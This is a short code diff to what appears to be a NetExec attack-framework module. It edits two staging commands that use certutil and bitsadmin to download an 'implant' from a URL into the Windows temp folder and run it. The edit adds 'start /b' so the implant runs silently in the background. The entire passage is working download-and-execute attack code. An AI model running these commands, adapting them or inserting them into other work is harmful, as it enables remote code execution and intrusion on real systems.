@@ -1371,14 +1371,14 @@ class NXCModule:
                 # Certutil download + execute
                 cmd = (
                     f'cmd /c certutil -urlcache -f {download_url} '
-                    f'%TEMP%\\{implant_name} && %TEMP%\\{implant_name}'
+                    f'%TEMP%\\{implant_name} && start /b %TEMP%\\{implant_name}'
                 )
                 context.log.debug(f"Using certutil staging method")
             elif self.staging_method == "bitsadmin":
                 # BITSAdmin download + execute
                 cmd = (
                     f'cmd /c bitsadmin /transfer job /download /priority high '
-                    f'{download_url} %TEMP%\\{implant_name} && %TEMP%\\{implant_name}'
+                    f'{download_url} %TEMP%\\{implant_name} && start /b %TEMP%\\{implant_name}'
                 )
                 context.log.debug(f"Using bitsadmin staging method")
             else:
